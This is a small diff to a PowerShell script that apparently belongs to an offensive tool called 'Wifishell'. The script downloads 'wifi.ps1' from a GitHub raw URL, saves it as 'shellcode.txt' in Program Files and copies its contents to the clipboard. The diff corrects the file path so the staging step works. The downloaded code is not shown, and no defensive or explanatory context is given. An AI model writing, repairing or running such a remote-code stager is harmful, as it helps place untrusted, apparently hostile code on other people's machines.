@@ -2,5 +2,5 @@ $source = "https://raw.githubusercontent.com/Danij123/Wifishell/master/wifi.ps1"
 $destination = "%PROGRAMFILES%\shellcode.txt"
 $web = New-Object System.Net.WebClient
 $web.DownloadFile($source, $destination)
-$file = Get-Content -Path C:\shellcode.txt -Encoding UTF8
+$file = Get-Content -Path $destination -Encoding UTF8
 Set-Clipboard -Value $file
